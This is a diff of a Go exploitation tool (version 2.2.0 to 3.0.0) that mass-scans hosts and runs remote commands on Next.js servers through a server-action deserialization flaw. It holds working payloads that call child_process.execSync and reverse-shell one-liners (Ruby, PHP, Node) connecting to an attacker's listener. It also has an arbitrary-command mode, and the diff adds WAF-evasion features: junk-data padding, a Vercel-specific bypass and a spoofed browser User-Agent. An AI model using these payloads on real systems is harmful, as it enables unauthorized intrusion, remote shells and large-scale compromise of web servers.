@@ -7,7 +7,10 @@ import (
 	"flag"
 	"fmt"
 	"io"
+	"log"
+	"math/rand"
 	"net/http"
+	"net/http/httputil"
 	"os"
 	"regexp"
 	"runtime"
@@ -19,7 +22,7 @@ import (
 )
 
 const (
-	Version  = "2.2.0"
+	Version  = "3.0.0"
 	Boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
 )
 
@@ -30,50 +33,51 @@ const (
 	Yellow = "\033[93m"
 	Blue   = "\033[94m"
 	Gray   = "\033[90m"
+	Cyan   = "\033[96m"
 )
 
-// Pre-compiled regex - compile once, use many times
 var rcePattern = regexp.MustCompile(`rce=11111`)
 
-// Pre-built payloads - build once at startup, reuse for all requests
 var (
-	rcePayload     string
-	rceContentType string
-	safePayload    string
+	rcePayload      string
+	rceContentType  string
+	safePayload     string
 	safeContentType string
-	payloadOnce    sync.Once
+	payloadOnce     sync.Once
 )
 
 func initPayloads() {
 	payloadOnce.Do(func() {
-		rcePayload, rceContentType = buildRCEPayload()
+		rcePayload, rceContentType = buildRCEPayload(false, 0)
 		safePayload, safeContentType = buildSafePayload()
 	})
 }
 
-// Result uses smaller types and omits empty fields
 type Result struct {
 	Host       string `json:"host"`
 	Vulnerable bool   `json:"vulnerable,omitempty"`
-	StatusCode int16  `json:"status_code,omitempty"` // int16 instead of int
+	StatusCode int16  `json:"status_code,omitempty"`
 	Error      string `json:"error,omitempty"`
 	Evidence   string `json:"evidence,omitempty"`
-	Timestamp  int64  `json:"timestamp"` // Unix timestamp instead of string
+	Timestamp  int64  `json:"timestamp"`
 }
 
 type ScanConfig struct {
-	Port        int
-	Path        string
-	Threads     int
-	Timeout     time.Duration
-	SafeMode    bool
-	Insecure    bool
-	UseTLS      bool
-	Verbose     bool
-	JSONOutput  bool
-	Quiet       bool
-	MaxMemoryMB int64
-	StreamMode  bool // Don't store results in memory
+	Port            int
+	Path            string
+	Threads         int
+	Timeout         time.Duration
+	SafeMode        bool
+	Insecure        bool
+	UseTLS          bool
+	Verbose         bool
+	JSONOutput      bool
+	Quiet           bool
+	MaxMemoryMB     int64
+	StreamMode      bool
+	WAFBypass       bool
+	WAFBypassSizeKB int
+	VercelWAFBypass bool
 }
 
 type ExploitConfig struct {
@@ -86,6 +90,18 @@ type ExploitConfig struct {
 	ListenerIP   string
 	ListenerPort int
 	Shell        string
+	Verbose      bool
+}
+
+type ExecConfig struct {
+	Target   string
+	Port     int
+	Path     string
+	UseTLS   bool
+	Insecure bool
+	Timeout  time.Duration
+	Command  string
+	Verbose  bool
 }
 
 type Stats struct {
@@ -95,15 +111,13 @@ type Stats struct {
 	Errors     int64
 }
 
-// Reusable buffer pool to avoid allocations
 var bufferPool = sync.Pool{
 	New: func() interface{} {
-		buf := make([]byte, 4096) // 4KB buffer for reading responses
+		buf := make([]byte, 4096)
 		return &buf
 	},
 }
 
-// Reusable string builder pool
 var stringBuilderPool = sync.Pool{
 	New: func() interface{} {
 		return &strings.Builder{}
@@ -128,7 +142,6 @@ func putStringBuilder(sb *strings.Builder) {
 	stringBuilderPool.Put(sb)
 }
 
-// MemoryLimiter with more aggressive controls
 type MemoryLimiter struct {
 	maxBytes      uint64
 	enabled       bool
@@ -144,8 +157,7 @@ func NewMemoryLimiter(maxMB int64) *MemoryLimiter {
 		ml.maxBytes = uint64(maxMB) * 1024 * 1024
 		ml.enabled = true
 		debug.SetMemoryLimit(int64(ml.maxBytes))
-		// More aggressive GC
-		debug.SetGCPercent(50) // Default is 100
+		debug.SetGCPercent(50)
 	}
 	return ml
 }
@@ -169,7 +181,7 @@ func (ml *MemoryLimiter) WaitForMemory() {
 	for GetMemoryUsage() >= threshold {
 		if atomic.CompareAndSwapInt32(&ml.paused, 0, 1) {
 			runtime.GC()
-			debug.FreeOSMemory() // Return memory to OS
+			debug.FreeOSMemory()
 		}
 		time.Sleep(ml.checkInterval)
 	}
@@ -185,7 +197,6 @@ func (ml *MemoryLimiter) ForceGC() {
 	}
 }
 
-// Lightweight logger - no mutex for non-critical paths
 type Logger struct {
 	quiet      bool
 	jsonOutput bool
@@ -239,7 +250,7 @@ func (l *Logger) Vuln(host, evidence string) {
 		return
 	}
 	l.mu.Lock()
-	fmt.Fprintf(os.Stdout, "%s[VULN]%s %s\n", Red, Reset, host)
+	fmt.Fprintf(os.Stdout, "%s[VULN]%s %s\n", Green, Reset, host)
 	if evidence != "" {
 		fmt.Fprintf(os.Stdout, "       %s%s%s\n", Gray, evidence, Reset)
 	}
@@ -269,13 +280,13 @@ func (l *Logger) Progress(scanned, total, vulnerable int64, memMB float64, memLi
 		return
 	}
 	l.mu.Lock()
-	pct := float64(scanned) / float64(total) * 100
+	pct := float64(scanned) / float64(total) * 100.0
 	if memLimit > 0 {
-		fmt.Fprintf(l.w, "\r%s[*]%s Progress: %d/%d (%.0f%%) | Vuln: %s%d%s | Mem: %.0f/%dMB  ",
-			Blue, Reset, scanned, total, pct, Red, vulnerable, Reset, memMB, memLimit)
+		fmt.Fprintf(l.w, "\r%s[*]%s Progress: %d/%d (%.1f%%) | Vuln: %s%d%s | Mem: %.0f/%dMB    ",
+			Blue, Reset, scanned, total, pct, Green, vulnerable, Reset, memMB, memLimit)
 	} else {
-		fmt.Fprintf(l.w, "\r%s[*]%s Progress: %d/%d (%.0f%%) | Vuln: %s%d%s | Mem: %.0fMB  ",
-			Blue, Reset, scanned, total, pct, Red, vulnerable, Reset, memMB)
+		fmt.Fprintf(l.w, "\r%s[*]%s Progress: %d/%d (%.1f%%) | Vuln: %s%d%s | Mem: %.0fMB    ",
+			Blue, Reset, scanned, total, pct, Green, vulnerable, Reset, memMB)
 	}
 	l.mu.Unlock()
 }
@@ -287,12 +298,100 @@ func (l *Logger) ClearLine() {
 	fmt.Fprint(l.w, "\r\033[K")
 }
 
-// Build payloads using string builder for efficiency
-func buildRCEPayload() (string, string) {
+func (l *Logger) Request(req *http.Request, body string) {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+
+	fmt.Fprintf(l.w, "\n%s>>> REQUEST >>>%s\n", Cyan, Reset)
+	fmt.Fprintf(l.w, "%s%s %s %s%s\n", Gray, req.Method, req.URL.String(), req.Proto, Reset)
+	fmt.Fprintf(l.w, "%sHost: %s%s\n", Gray, req.Host, Reset)
+	for key, values := range req.Header {
+		for _, value := range values {
+			fmt.Fprintf(l.w, "%s%s: %s%s\n", Gray, key, value, Reset)
+		}
+	}
+	fmt.Fprintf(l.w, "%s%s\n", Gray, Reset)
+	if body != "" {
+		if len(body) > 2000 {
+			fmt.Fprintf(l.w, "%s%s...%s\n", Gray, body[:2000], Reset)
+			fmt.Fprintf(l.w, "%s[truncated %d bytes]%s\n", Gray, len(body)-2000, Reset)
+		} else {
+			fmt.Fprintf(l.w, "%s%s%s\n", Gray, body, Reset)
+		}
+	}
+}
+
+func (l *Logger) Response(resp *http.Response, body string) {
+	l.mu.Lock()
+	defer l.mu.Unlock()
+
+	fmt.Fprintf(l.w, "\n%s<<< RESPONSE <<<%s\n", Cyan, Reset)
+	fmt.Fprintf(l.w, "%s%s %s%s\n", Gray, resp.Proto, resp.Status, Reset)
+	for key, values := range resp.Header {
+		for _, value := range values {
+			fmt.Fprintf(l.w, "%s%s: %s%s\n", Gray, key, value, Reset)
+		}
+	}
+	fmt.Fprintf(l.w, "%s%s\n", Gray, Reset)
+	if body != "" {
+		if len(body) > 2000 {
+			fmt.Fprintf(l.w, "%s%s...%s\n", Gray, body[:2000], Reset)
+			fmt.Fprintf(l.w, "%s[truncated %d bytes]%s\n", Gray, len(body)-2000, Reset)
+		} else {
+			fmt.Fprintf(l.w, "%s%s%s\n", Gray, body, Reset)
+		}
+	}
+	fmt.Fprintln(l.w)
+}
+
+func generateJunkData(sizeBytes int) (string, string) {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	paramName := make([]byte, 12)
+	for i := range paramName {
+		paramName[i] = charset[rand.Intn(26)]
+	}
+	junk := make([]byte, sizeBytes)
+	for i := range junk {
+		junk[i] = charset[rand.Intn(len(charset))]
+	}
+	return string(paramName), string(junk)
+}
+
+func buildRCEPayload(wafBypass bool, wafBypassSizeKB int) (string, string) {
 	cmd := `echo $((41*271))`
 	prefix := `var res=process.mainModule.require('child_process').execSync('` + cmd + `').toString().trim();` +
 		"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/vuln?rce=${res};307;`});"
-	return buildPayloadWithPrefix(prefix)
+
+	return buildPayloadWithPrefix(prefix, wafBypass, wafBypassSizeKB)
+}
+
+func buildVercelWAFBypassPayload() (string, string) {
+	sb := getStringBuilder()
+	defer putStringBuilder(sb)
+
+	part0 := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,` +
+		`"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":` +
+		`"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;` +
+		`throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \"NEXT_REDIRECT;push;/vuln?rce=${res};307;\"});",` +
+		`"_chunks":"$Q2","_formData":{"get":"$3:\"$$:constructor:constructor"}}}`
+
+	sb.WriteString("--")
+	sb.WriteString(Boundary)
+	sb.WriteString("\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n")
+	sb.WriteString(part0)
+	sb.WriteString("\r\n--")
+	sb.WriteString(Boundary)
+	sb.WriteString("\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--")
+	sb.WriteString(Boundary)
+	sb.WriteString("\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n--")
+	sb.WriteString(Boundary)
+	sb.WriteString("\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n")
+	sb.WriteString(`{""\u0024\u0024":{}}`)
+	sb.WriteString("\r\n--")
+	sb.WriteString(Boundary)
+	sb.WriteString("--\r\n")
+
+	return sb.String(), "multipart/form-data; boundary=" + Boundary
 }
 
 func buildSafePayload() (string, string) {
@@ -332,7 +431,7 @@ func buildReverseShellPayload(listenerIP string, listenerPort int, shellType str
 		cmd = fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%d).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, listenerIP, listenerPort)
 	case "php":
 		cmd = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");'`, listenerIP, listenerPort)
-	default: // node
+	default:
 		cmd = fmt.Sprintf(`node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(%d,"%s",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'`, listenerPort, listenerIP)
 	}
 
@@ -342,7 +441,7 @@ func buildReverseShellPayload(listenerIP string, listenerPort int, shellType str
 	prefix := `process.mainModule.require('child_process').exec('` + escapedCmd + `');` +
 		"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/pwned;307;`});"
 
-	return buildPayloadWithPrefix(prefix)
+	return buildPayloadWithPrefix(prefix, false, 0)
 }
 
 func buildCustomCommandPayload(command string) (string, string) {
@@ -352,15 +451,13 @@ func buildCustomCommandPayload(command string) (string, string) {
 	prefix := `process.mainModule.require('child_process').execSync('` + escapedCmd + `');` +
 		"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/cmd;307;`});"
 
-	return buildPayloadWithPrefix(prefix)
+	return buildPayloadWithPrefix(prefix, false, 0)
 }
 
-func buildPayloadWithPrefix(prefix string) (string, string) {
-	// Build JSON manually to avoid reflection overhead from json.Marshal
+func buildPayloadWithPrefix(prefix string, wafBypass bool, wafBypassSizeKB int) (string, string) {
 	sb := getStringBuilder()
 	defer putStringBuilder(sb)
 
-	// Escape the prefix for JSON
 	escapedPrefix := strings.ReplaceAll(prefix, `\`, `\\`)
 	escapedPrefix = strings.ReplaceAll(escapedPrefix, `"`, `\"`)
 	escapedPrefix = strings.ReplaceAll(escapedPrefix, "\n", `\n`)
@@ -369,6 +466,17 @@ func buildPayloadWithPrefix(prefix string) (string, string) {
 
 	chunk := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"` +
 		escapedPrefix + `","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`
+
+	if wafBypass && wafBypassSizeKB > 0 {
+		paramName, junk := generateJunkData(wafBypassSizeKB * 1024)
+		sb.WriteString("--")
+		sb.WriteString(Boundary)
+		sb.WriteString("\r\nContent-Disposition: form-data; name=\"")
+		sb.WriteString(paramName)
+		sb.WriteString("\"\r\n\r\n")
+		sb.WriteString(junk)
+		sb.WriteString("\r\n")
+	}
 
 	sb.WriteString("--")
 	sb.WriteString(Boundary)
@@ -385,21 +493,17 @@ func buildPayloadWithPrefix(prefix string) (string, string) {
 	return sb.String(), "multipart/form-data; boundary=" + Boundary
 }
 
-// Optimized URL building without extra allocations
 func buildURL(host string, port int, useTLS bool, path string) string {
 	host = strings.TrimSpace(host)
 
-	// Remove protocol prefixes
 	if strings.HasPrefix(host, "https://") {
 		host = host[8:]
 	} else if strings.HasPrefix(host, "http://") {
 		host = host[7:]
 	}
 
-	// Remove trailing slash
 	host = strings.TrimSuffix(host, "/")
 
-	// Remove existing port
 	if idx := strings.LastIndex(host, ":"); idx != -1 {
 		if !strings.Contains(host[idx:], "]") {
 			host = host[:idx]
@@ -431,20 +535,19 @@ func buildURL(host string, port int, useTLS bool, path string) string {
 	return sb.String()
 }
 
-// Shared HTTP client with connection pooling
 var httpClientPool = sync.Pool{
 	New: func() interface{} {
 		return &http.Client{
 			Timeout: 10 * time.Second,
 			Transport: &http.Transport{
 				TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
-				DisableKeepAlives:     false, // Enable keep-alives for connection reuse
+				DisableKeepAlives:     false,
 				MaxIdleConns:          100,
 				MaxIdleConnsPerHost:   10,
 				MaxConnsPerHost:       20,
 				IdleConnTimeout:       30 * time.Second,
 				ResponseHeaderTimeout: 10 * time.Second,
-				DisableCompression:    true, // Disable to reduce memory
+				DisableCompression:    true,
 			},
 			CheckRedirect: func(req *http.Request, via []*http.Request) error {
 				return http.ErrUseLastResponse
@@ -475,13 +578,47 @@ func sendRequest(client *http.Client, url, payload, contentType string) (*http.R
 	req.Header.Set("Content-Type", contentType)
 	req.Header.Set("Next-Action", "c3a144622dd5b5046f1ccb6007fea3f3710057de")
 	req.Header.Set("Accept", "text/x-component")
-	req.Header.Set("User-Agent", "Mozilla/5.0")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
 	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("X-Nextjs-Request-Id", "b5dce965")
+	req.Header.Set("X-Nextjs-Html-Request-Id", "SSTMXm7OJ_g0Ncx6jpQt9")
 
 	return client.Do(req)
 }
 
-// Scan with streaming response reading to minimize memory
+func sendRequestVerbose(client *http.Client, url, payload, contentType string, logger *Logger) (*http.Response, string, error) {
+	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
+	if err != nil {
+		return nil, "", err
+	}
+
+	req.Header.Set("Content-Type", contentType)
+	req.Header.Set("Next-Action", "c3a144622dd5b5046f1ccb6007fea3f3710057de")
+	req.Header.Set("Accept", "text/x-component")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("X-Nextjs-Request-Id", "b5dce965")
+	req.Header.Set("X-Nextjs-Html-Request-Id", "SSTMXm7OJ_g0Ncx6jpQt9")
+
+	logger.Request(req, payload)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, "", err
+	}
+
+	bodyBytes, err := io.ReadAll(resp.Body)
+	resp.Body.Close()
+	if err != nil {
+		return resp, "", err
+	}
+
+	bodyStr := string(bodyBytes)
+	logger.Response(resp, bodyStr)
+
+	return resp, bodyStr, nil
+}
+
 func scan(host string, config *ScanConfig, client *http.Client) Result {
 	url := buildURL(host, config.Port, config.UseTLS, config.Path)
 	result := Result{
@@ -492,6 +629,10 @@ func scan(host string, config *ScanConfig, client *http.Client) Result {
 	var payload, contentType string
 	if config.SafeMode {
 		payload, contentType = safePayload, safeContentType
+	} else if config.VercelWAFBypass {
+		payload, contentType = buildVercelWAFBypassPayload()
+	} else if config.WAFBypass {
+		payload, contentType = buildRCEPayload(true, config.WAFBypassSizeKB)
 	} else {
 		payload, contentType = rcePayload, rceContentType
 	}
@@ -505,12 +646,11 @@ func scan(host string, config *ScanConfig, client *http.Client) Result {
 
 	result.StatusCode = int16(resp.StatusCode)
 
-	// Check headers first (no body read needed)
 	if !config.SafeMode {
 		if h := resp.Header.Get("X-Action-Redirect"); h != "" && rcePattern.MatchString(h) {
 			result.Vulnerable = true
 			result.Evidence = "RCE via X-Action-Redirect"
-			io.Copy(io.Discard, resp.Body) // Drain body
+			io.Copy(io.Discard, resp.Body)
 			return result
 		}
 		if h := resp.Header.Get("Location"); h != "" && rcePattern.MatchString(h) {
@@ -521,7 +661,6 @@ func scan(host string, config *ScanConfig, client *http.Client) Result {
 		}
 	}
 
-	// Read body with limited buffer - stream instead of loading all
 	vuln, evidence := checkResponseBody(resp, config.SafeMode)
 	if vuln {
 		result.Vulnerable = true
@@ -531,12 +670,10 @@ func scan(host string, config *ScanConfig, client *http.Client) Result {
 	return result
 }
 
-// Stream-based body checking to avoid loading entire response
 func checkResponseBody(resp *http.Response, safeMode bool) (bool, string) {
 	buf := getBuffer()
 	defer putBuffer(buf)
 
-	// Read up to 8KB in chunks
 	var totalRead int
 	maxRead := 8192
 
@@ -552,7 +689,11 @@ func checkResponseBody(resp *http.Response, safeMode bool) (bool, string) {
 				}
 			} else {
 				if resp.StatusCode == 500 {
-					if strings.Contains(chunk, `E{"digest"`) || strings.Contains(chunk, "NEXT_REDIRECT") {
+					server := strings.ToLower(resp.Header.Get("Server"))
+					hasNetlifyVary := resp.Header.Get("Netlify-Vary") != ""
+					isMitigated := hasNetlifyVary || server == "netlify" || server == "vercel"
+
+					if !isMitigated && (strings.Contains(chunk, `E{"digest"`) || strings.Contains(chunk, "NEXT_REDIRECT")) {
 						io.Copy(io.Discard, resp.Body)
 						return true, "Potentially vulnerable (RSC error)"
 					}
@@ -569,18 +710,10 @@ func checkResponseBody(resp *http.Response, safeMode bool) (bool, string) {
 		}
 	}
 
-	// Drain remaining body
 	io.Copy(io.Discard, resp.Body)
 	return false, ""
 }
 
-// Check safe mode headers
-func checkSafeModeHeaders(resp *http.Response) bool {
-	server := strings.ToLower(resp.Header.Get("Server"))
-	return server == "vercel" || server == "netlify" || resp.Header.Get("Netlify-Vary") != ""
-}
-
-// Truncate error messages to save memory
 func truncateError(err string) string {
 	if len(err) > 64 {
 		return err[:64]
@@ -588,75 +721,100 @@ func truncateError(err string) string {
 	return err
 }
 
-func exploit(config *ExploitConfig, log *Logger) error {
+func exploit(config *ExploitConfig, logger *Logger) error {
 	url := buildURL(config.Target, config.Port, config.UseTLS, config.Path)
 
-	log.Info("Target:   %s", url)
-	log.Info("Listener: %s:%d", config.ListenerIP, config.ListenerPort)
-	log.Info("Shell:    %s", config.Shell)
+	logger.Info("Target:   %s", url)
+	logger.Info("Listener: %s:%d", config.ListenerIP, config.ListenerPort)
+	logger.Info("Shell:    %s", config.Shell)
 
 	payload, contentType := buildReverseShellPayload(config.ListenerIP, config.ListenerPort, config.Shell)
 	client := getHTTPClient(config.Timeout, config.Insecure)
 	defer putHTTPClient(client)
 
-	log.Info("Sending payload...")
+	logger.Info("Sending payload...")
 
-	resp, err := sendRequest(client, url, payload, contentType)
+	var resp *http.Response
+	var err error
+	var bodyStr string
+
+	if config.Verbose {
+		resp, bodyStr, err = sendRequestVerbose(client, url, payload, contentType, logger)
+	} else {
+		resp, err = sendRequest(client, url, payload, contentType)
+		if resp != nil {
+			defer resp.Body.Close()
+			io.Copy(io.Discard, resp.Body)
+		}
+	}
+
 	if err != nil {
 		return err
 	}
-	defer resp.Body.Close()
-	io.Copy(io.Discard, resp.Body)
 
-	log.Info("Response: %d", resp.StatusCode)
+	logger.Info("Response: %d", resp.StatusCode)
 
 	switch {
 	case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
-		log.Success("Redirect received, payload likely executed")
-		log.Success("Check your listener for incoming connection")
+		logger.Success("Redirect received, payload likely executed")
+		logger.Success("Check your listener for incoming connection")
 	case resp.StatusCode == 500:
-		log.Warning("Got 500, command may have executed")
+		logger.Warning("Got 500, command may have executed")
 	default:
-		log.Warning("Unexpected response, exploit may have failed")
+		logger.Warning("Unexpected response, exploit may have failed")
 	}
+
+	_ = bodyStr
 
 	return nil
 }
 
-func execCmd(target string, port int, useTLS bool, path, command string, insecure bool, timeout time.Duration, log *Logger) error {
-	url := buildURL(target, port, useTLS, path)
+func execCmd(config *ExecConfig, logger *Logger) error {
+	url := buildURL(config.Target, config.Port, config.UseTLS, config.Path)
 
-	log.Info("Target:  %s", url)
-	log.Info("Command: %s", command)
+	logger.Info("Target:  %s", url)
+	logger.Info("Command: %s", config.Command)
 
-	payload, contentType := buildCustomCommandPayload(command)
-	client := getHTTPClient(timeout, insecure)
+	payload, contentType := buildCustomCommandPayload(config.Command)
+	client := getHTTPClient(config.Timeout, config.Insecure)
 	defer putHTTPClient(client)
 
-	log.Info("Sending command...")
+	logger.Info("Sending command...")
 
-	resp, err := sendRequest(client, url, payload, contentType)
+	var resp *http.Response
+	var err error
+	var bodyStr string
+
+	if config.Verbose {
+		resp, bodyStr, err = sendRequestVerbose(client, url, payload, contentType, logger)
+	} else {
+		resp, err = sendRequest(client, url, payload, contentType)
+		if resp != nil {
+			defer resp.Body.Close()
+			io.Copy(io.Discard, resp.Body)
+		}
+	}
+
 	if err != nil {
 		return err
 	}
-	defer resp.Body.Close()
-	io.Copy(io.Discard, resp.Body)
 
-	log.Info("Response: %d", resp.StatusCode)
+	logger.Info("Response: %d", resp.StatusCode)
 
 	switch {
 	case resp.StatusCode == 307 || resp.StatusCode == 302 || resp.StatusCode == 303:
-		log.Success("Command executed (redirect received)")
+		logger.Success("Command executed (redirect received)")
 	case resp.StatusCode == 500:
-		log.Warning("Got 500, command likely executed")
+		logger.Warning("Got 500, command likely executed")
 	default:
-		log.Warning("Unexpected response")
+		logger.Warning("Unexpected response")
 	}
+
+	_ = bodyStr
 
 	return nil
 }
 
-// Worker pool pattern for better memory control
 type WorkerPool struct {
 	workers    int
 	tasks      chan string
@@ -670,7 +828,7 @@ type WorkerPool struct {
 func NewWorkerPool(workers int, config *ScanConfig, memLimiter *MemoryLimiter) *WorkerPool {
 	return &WorkerPool{
 		workers:    workers,
-		tasks:      make(chan string, workers*2), // Buffered channel
+		tasks:      make(chan string, workers*2),
 		results:    make(chan Result, workers*2),
 		config:     config,
 		memLimiter: memLimiter,
@@ -710,20 +868,19 @@ func (wp *WorkerPool) Results() <-chan Result {
 	return wp.results
 }
 
-func runScan(targets []string, config *ScanConfig, output string, log *Logger) {
-	initPayloads() // Initialize payloads once
+func runScan(targets []string, config *ScanConfig, output string, logger *Logger) {
+	initPayloads()
 
 	stats := &Stats{Total: int64(len(targets))}
 	memLimiter := NewMemoryLimiter(config.MaxMemoryMB)
 
-	// For stream mode, write results directly to file
 	var outFile *os.File
 	var outWriter *bufio.Writer
 	if output != "" && config.StreamMode {
 		var err error
 		outFile, err = os.Create(output)
 		if err != nil {
-			log.Error("Failed to create output file: %v", err)
+			logger.Error("Failed to create output file: %v", err)
 			os.Exit(1)
 		}
 		defer outFile.Close()
@@ -731,7 +888,6 @@ func runScan(targets []string, config *ScanConfig, output string, log *Logger) {
 		defer outWriter.Flush()
 	}
 
-	// Non-stream mode storage
 	var results []Result
 	var vulnerableHosts []string
 	var resultsMu sync.Mutex
@@ -739,17 +895,22 @@ func runScan(targets []string, config *ScanConfig, output string, log *Logger) {
 	startTime := time.Now()
 
 	if config.MaxMemoryMB > 0 {
-		log.Info("Targets: %d | Threads: %d | Max mem: %dMB | Stream: %v",
+		logger.Info("Targets: %d | Threads: %d | Max mem: %dMB | Stream: %v",
 			len(targets), config.Threads, config.MaxMemoryMB, config.StreamMode)
 	} else {
-		log.Info("Targets: %d | Threads: %d | Stream: %v", len(targets), config.Threads, config.StreamMode)
+		logger.Info("Targets: %d | Threads: %d | Stream: %v", len(targets), config.Threads, config.StreamMode)
 	}
 
-	// Use worker pool
+	if config.WAFBypass {
+		logger.Info("WAF bypass enabled (%dKB junk data)", config.WAFBypassSizeKB)
+	}
+	if config.VercelWAFBypass {
+		logger.Info("Vercel WAF bypass mode enabled")
+	}
+
 	pool := NewWorkerPool(config.Threads, config, memLimiter)
 	pool.Start()
 
-	// Feed targets to workers
 	go func() {
 		for _, t := range targets {
 			pool.Submit(t)
@@ -757,14 +918,16 @@ func runScan(targets []string, config *ScanConfig, output string, log *Logger) {
 		pool.Close()
 	}()
 
-	// Process results
+	lastProgressUpdate := time.Now()
+	progressInterval := 100 * time.Millisecond
+
 	for result := range pool.Results() {
 		scanned := atomic.AddInt64(&stats.Scanned, 1)
 
 		if result.Vulnerable {
 			atomic.AddInt64(&stats.Vulnerable, 1)
-			log.ClearLine()
-			log.Vuln(result.Host, result.Evidence)
+			logger.ClearLine()
+			logger.Vuln(result.Host, result.Evidence)
 
 			if config.StreamMode && outWriter != nil {
 				outWriter.WriteString(result.Host + "\n")
@@ -776,30 +939,30 @@ func runScan(targets []string, config *ScanConfig, output string, log *Logger) {
 		} else if result.Error != "" {
 			atomic.AddInt64(&stats.Errors, 1)
 			if config.Verbose {
-				log.ClearLine()
-				log.ScanError(result.Host, result.Error)
+				logger.ClearLine()
+				logger.ScanError(result.Host, result.Error)
 			}
 		} else if config.Verbose {
-			log.ClearLine()
-			log.Safe(result.Host, result.StatusCode)
+			logger.ClearLine()
+			logger.Safe(result.Host, result.StatusCode)
 		}
 
-		// Store results only if JSON output and not streaming
 		if config.JSONOutput && !config.StreamMode {
 			resultsMu.Lock()
 			results = append(results, result)
 			resultsMu.Unlock()
 		}
 
-		// Update progress every 10 scans to reduce overhead
-		if scanned%10 == 0 || scanned == stats.Total {
-			log.Progress(scanned, stats.Total, atomic.LoadInt64(&stats.Vulnerable),
+		now := time.Now()
+		if now.Sub(lastProgressUpdate) >= progressInterval || scanned == stats.Total {
+			logger.Progress(scanned, stats.Total, atomic.LoadInt64(&stats.Vulnerable),
 				GetMemoryUsageMB(), config.MaxMemoryMB)
+			lastProgressUpdate = now
 		}
 	}
 
 	duration := time.Since(startTime)
-	log.ClearLine()
+	logger.ClearLine()
 
 	if config.JSONOutput && !config.StreamMode {
 		enc := json.NewEncoder(os.Stdout)
@@ -808,12 +971,11 @@ func runScan(targets []string, config *ScanConfig, output string, log *Logger) {
 	} else {
 		fmt.Fprintf(os.Stderr, "\n%s[*]%s Completed in %s\n", Blue, Reset, duration.Round(time.Millisecond))
 		fmt.Fprintf(os.Stderr, "    Scanned:    %d\n", stats.Scanned)
-		fmt.Fprintf(os.Stderr, "    Vulnerable: %s%d%s\n", Red, stats.Vulnerable, Reset)
+		fmt.Fprintf(os.Stderr, "    Vulnerable: %s%d%s\n", Green, stats.Vulnerable, Reset)
 		fmt.Fprintf(os.Stderr, "    Errors:     %d\n", stats.Errors)
 		fmt.Fprintf(os.Stderr, "    Peak mem:   %.0fMB\n", GetMemoryUsageMB())
 	}
 
-	// Write non-stream output
 	if output != "" && !config.StreamMode && len(vulnerableHosts) > 0 {
 		sb := getStringBuilder()
 		for _, h := range vulnerableHosts {
@@ -821,9 +983,9 @@ func runScan(targets []string, config *ScanConfig, output string, log *Logger) {
 			sb.WriteByte('\n')
 		}
 		if err := os.WriteFile(output, []byte(sb.String()), 0644); err != nil {
-			log.Error("Failed to write output: %v", err)
+			logger.Error("Failed to write output: %v", err)
 		} else {
-			log.Success("Saved %d vulnerable hosts to %s", len(vulnerableHosts), output)
+			logger.Success("Saved %d vulnerable hosts to %s", len(vulnerableHosts), output)
 		}
 		putStringBuilder(sb)
 	}
@@ -831,27 +993,6 @@ func runScan(targets []string, config *ScanConfig, output string, log *Logger) {
 	if stats.Vulnerable > 0 {
 		os.Exit(1)
 	}
-}
-
-// Stream targets from file instead of loading all into memory
-func streamTargets(filename string, ch chan<- string) error {
-	file, err := os.Open(filename)
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	scanner := bufio.NewScanner(file)
-	scanner.Buffer(make([]byte, 1024), 1024) // Small buffer
-
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" && line[0] != '#' {
-			ch <- line
-		}
-	}
-
-	return scanner.Err()
 }
 
 func loadTargets(filename string) ([]string, error) {
@@ -875,30 +1016,14 @@ func loadTargets(filename string) ([]string, error) {
 	return targets, scanner.Err()
 }
 
-func countLines(filename string) (int, error) {
-	file, err := os.Open(filename)
-	if err != nil {
-		return 0, err
-	}
-	defer file.Close()
-
-	count := 0
-	scanner := bufio.NewScanner(file)
-	scanner.Buffer(make([]byte, 1024), 1024)
-
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" && line[0] != '#' {
-			count++
-		}
-	}
-
-	return count, scanner.Err()
+func suppressHTTPLogs() {
+	log.SetOutput(io.Discard)
 }
 
 func main() {
-	// Set low memory defaults
+	suppressHTTPLogs()
 	debug.SetGCPercent(100)
